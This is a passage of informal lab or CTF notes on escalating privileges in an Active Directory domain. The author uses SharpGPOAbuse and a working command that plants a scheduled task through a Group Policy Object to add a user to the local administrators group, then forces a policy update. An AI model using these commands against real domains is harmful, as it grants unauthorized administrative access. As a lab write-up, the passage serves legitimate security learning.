If want to go in deep what is happening with the generic and object stuff go through this blog
https://zflemingg1.gitbook.io/undergrad-tutorials/active-directory-acl-abuse/genericwrite-exploit

Will  try to abuse the feature using this tool
https://github.com/FSecureLABS/SharpGPOAbuse

```
net user enterprise-security
```

![[Pasted image 20230917213122.png]]
As u can see  that only Domain admins are able to write the Global Group Memberships but will try to change that to Local Group Memberships using the above tool

```
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"
```
![[Pasted image 20230917224629.png]]


```
gpupdate /force
```
![[Pasted image 20230917225114.png]]

When i run the net user command 2 times i was able to see the changes in the output
![[Pasted image 20230917225727.png]]
Volla now we are a local group Admin hahahahahahahha so will try to read the file before were 
denied to read that.

Now it's time for SMB again 
